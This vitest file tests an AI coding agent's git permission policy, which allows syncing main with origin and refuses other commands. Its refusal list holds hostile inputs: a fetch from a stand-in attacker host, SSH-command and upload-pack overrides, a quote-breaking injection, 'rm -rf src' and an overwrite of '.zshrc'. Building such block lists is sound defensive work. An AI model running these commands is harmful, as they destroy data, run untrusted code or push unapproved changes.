import { describe, expect, it } from 'vitest';
import { ASK_ONLY_REASON, decideTool, denyReason } from '../src/agent/policy.js';
import { SYNC_MAIN_REASON, buildSyncMainAppend, isSyncMainCommand, syncMainPrompt } from '../src/agent/sync-main.js';
import { createMockBackend } from '../src/agent/mock.js';
import type { AgentRunInput, RoomBridge } from '../src/agent/types.js';

/** "Let Claude handle it": in that one run, main may be synced with git — and nothing else changes. */

const conflicted = (p: string) => ['/work/app/src/a.ts', 'src/a.ts', 'package-lock.json'].includes(p);
const merging = { branch: 'main', upstream: 'origin/main', midOperation: () => true, conflicted };
const idle = { branch: 'main', upstream: 'origin/main', midOperation: () => false, conflicted: () => false };
const sync = { cwd: '/work/app', roots: ['/work/app'], autoEdit: false, askOnly: true, scope: 'full' as const, syncMain: merging };
const askOnly = { cwd: '/work/app', roots: ['/work/app'], autoEdit: false, askOnly: true, scope: 'full' as const };
const bash = (command: string) => ({ command });

describe('isSyncMainCommand', () => {
  it('allows git syncing', () => {
    for (const c of [
      'git fetch',
      'git fetch origin',
      'git fetch origin main',
      'git pull --ff-only',
      'git pull --rebase origin main',
      'git pull --no-rebase --no-edit',
      'git merge origin/main',
      'git merge FETCH_HEAD',
      'git merge --no-edit origin/main',
      'git merge -m "Merge origin/main (keeps the hotfix!)" origin/main',
      'git merge --continue',
      'git merge --abort',
      'GIT_EDITOR=true git rebase --continue',
      'git rebase --abort',
      'git stash',
      'git stash push -u -m "before updating main"',
      'git stash apply 3f2a9c1',
      'git stash pop 3f2a9c1d00aa',
      'git stash list',
      'git stash list --format="%H %gs"',
      'git checkout --theirs -- package-lock.json',
      'git checkout --ours -- src/a.ts',
      'git restore --staged -- src/a.ts',
      'git add src/a.ts',
      'git add -A',
      'git commit --no-edit',
      'git commit -m "Merge origin/main"',
      'git fetch && git status && git log --oneline -5',
      'git stash push -u && git pull --ff-only',
      'git status 2>&1',
    ]) {
      expect(isSyncMainCommand(c, merging), c).toBe(true);
    }
  });

  it('refuses pushing, discarding, and anything else', () => {
    for (const c of [
      'git push',
      'git push origin main',
      'git fetch && git push',
      'git reset --hard origin/main',
      'git reset --hard',
      'git checkout -- src/a.ts',
      'git checkout .',
      'git checkout main',
      'git checkout -m main',
      'git checkout --ours -- src/b.ts',
      'git checkout --theirs src/a.ts',
      'git restore src/a.ts',
      'git clean -fd',
      'git stash drop',
      'git stash clear',
      'git stash pop',
      'git stash apply stash@{0}',
      'git stash show -p --output=/Users/x/.zshrc stash@{0}',
      'git rebase --skip',
      'git rebase origin/main -i',
      'git commit -a -m wip',
      'git commit --amend --no-edit',
      'git commit --no-verify -m x',
      'git branch -D main',
      'git fetch origin +main:main',
      "git fetch --prune origin 'refs/heads/*:refs/heads/*'",
      'git fetch --prune',
      'git fetch /some/other/repo',
      'git fetch https://evil.example/x.git',
      'git pull upstream main',
      'git merge feature/other',
      'git merge evil/branch',
      'git -c core.sshCommand=evil fetch',
      'git -C ../other pull',
      'cd ../other && git pull',
      'GIT_SSH_COMMAND=evil git fetch',
      'A=--upload-pack=./x.sh; git fetch $A origin',
      'PATH=/tmp/evil; git fetch',
      "git add -A \\'; git push origin main; echo \\'",
      'git merge -s ours origin/main',
      'git fetch --upload-pack=evil',
      'git pull > out.txt',
      'git pull $(echo)',
      'git commit -m "$(rm -rf src)"',
      'rm -rf src',
      'npm install',
      'git add -p',
    ]) {
      expect(isSyncMainCommand(c, merging), c).toBe(false);
    }
  });

  it('commits only to conclude a merge or rebase', () => {
    expect(isSyncMainCommand('git commit --no-edit', idle)).toBe(false);
    expect(isSyncMainCommand('git commit --no-edit', merging)).toBe(true);
  });
});

describe('the policy in a sync run', () => {
  it('lets the sync through to the usual approval, and blocks the rest with its own reason', () => {
    expect(decideTool('Bash', bash('git pull --ff-only'), sync)).toBe('ask');
    expect(decideTool('Bash', bash('git push'), sync)).toBe('deny');
    expect(denyReason('Bash', bash('git push'), sync)).toBe(SYNC_MAIN_REASON);
    expect(decideTool('Bash', bash('git reset --hard'), sync)).toBe('deny');
  });

  it('only files with conflict markers can be edited', () => {
    expect(decideTool('Edit', { file_path: '/work/app/src/a.ts' }, sync)).toBe('ask');
    expect(decideTool('Edit', { file_path: 'src/a.ts' }, { ...sync, syncMain: { conflicted: (p: string) => p === '/work/app/src/a.ts' } })).toBe('ask');
    expect(decideTool('Write', { file_path: '/work/app/src/b.ts' }, sync)).toBe('deny');
    expect(decideTool('Write', { file_path: '/work/app/.env' }, { ...sync, syncMain: { conflicted: () => true } })).toBe('deny');
  });

  it('without the sync scope, a main folder stays questions only', () => {
    expect(decideTool('Bash', bash('git pull --ff-only'), askOnly)).toBe('deny');
    expect(denyReason('Bash', bash('git pull'), askOnly)).toBe(ASK_ONLY_REASON);
    expect(decideTool('Edit', { file_path: '/work/app/src/a.ts' }, askOnly)).toBe('deny');
    expect(decideTool('Bash', bash('git status'), sync)).toBe('ask');
  });

  it('tells Claude the job and its limits', () => {
    const append = buildSyncMainAppend('app', 'main', 'origin/main');
    expect(append).toMatch(/bring main up to date with origin\/main/);
    expect(append).toMatch(/Never push/);
    const prompt = syncMainPrompt({ branch: 'main', upstream: 'origin/main', situation: 'main is 3 behind origin/main.', dirty: ['a.ts'] });
    expect(prompt).toMatch(/keep them\): a\.ts/);
    expect(prompt).toMatch(/short explanation/);
  });
});

describe('the demo’s Claude in a sync run', () => {
  it('reports updating main instead of moving to a worktree', async () => {
    const backend = createMockBackend({} as RoomBridge, 0);
    const events: string[] = [];
    const answer = await backend.run({
      prompt: 'Bring main up to date with origin/main',
      requesterName: 'kay',
      context: [],
      place: { cwd: '/w', additionalDirectories: [], autoEdit: false, onSession: () => undefined, askOnly: { project: 'app' }, syncMain: { branch: 'main', upstream: 'origin/main' } },
      signal: new AbortController().signal,
      onEvent: (k: string, t: string) => void events.push(`${k}:${t}`),
      onFileTouched: () => undefined,
      canUseTool: async () => true,
    } as unknown as AgentRunInput);
    expect(answer).toMatch(/main is up to date with origin\/main/);
    expect(events.some((e) => e.includes('git merge origin/main'))).toBe(true);
  });
});
